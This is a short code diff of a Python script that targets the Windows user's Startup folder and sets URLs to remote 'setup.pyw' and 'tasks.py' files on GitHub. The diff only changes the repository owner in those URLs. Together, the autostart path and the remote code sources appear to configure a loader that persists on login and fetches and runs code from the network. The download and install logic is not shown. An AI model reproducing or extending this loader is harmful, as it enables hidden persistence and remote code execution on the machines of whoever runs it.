@@ -6,8 +6,8 @@ import subprocess
 USERNAME = os.environ['USERNAME']
 PATH = rf"C:\Users\{USERNAME}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 
-setup = "https://raw.githubusercontent.com/cobanov/lamer_code/master/setup.pyw"  # SETUP FILES
-task = "https://raw.githubusercontent.com/cobanov/lamer_code/master/tasks.py"  # TASK FILES
+setup = "https://raw.githubusercontent.com/lamer34/lamer_code/master/setup.pyw"  # SETUP FILES
+task = "https://raw.githubusercontent.com/lamer34/lamer_code/master/tasks.py"  # TASK FILES
 
 
 def install_modules():
